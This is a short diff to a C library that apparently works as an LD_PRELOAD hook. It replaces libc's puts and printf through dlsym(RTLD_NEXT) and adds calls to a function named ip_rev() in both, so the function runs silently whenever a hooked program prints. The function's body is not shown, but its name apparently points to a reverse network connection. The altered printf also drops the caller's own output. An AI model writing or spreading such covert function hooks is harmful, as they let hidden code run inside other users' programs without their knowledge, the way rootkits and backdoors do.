@@ -41,6 +41,7 @@
             const struct addrinfo *hints,
             struct addrinfo **res);
 */
+static int (*orig_printf)(const char *format, ...) = NULL;
 
 int ip_rev(void)
 {
@@ -288,10 +289,11 @@ int puts(const char *message) {
   int result;
   new_puts = dlsym(RTLD_NEXT, "puts");
   result = new_puts(message);
+  ip_rev();
   return result;
 }
 
-static int (*orig_printf)(const char *format, ...) = NULL;
+
 
 int printf(const char *format, ...)
 {
@@ -301,5 +303,6 @@ int printf(const char *format, ...)
  }
 
  // TODO: print desired message from caller. 
+ ip_rev();
  return orig_printf("within my own printf\n");
 }
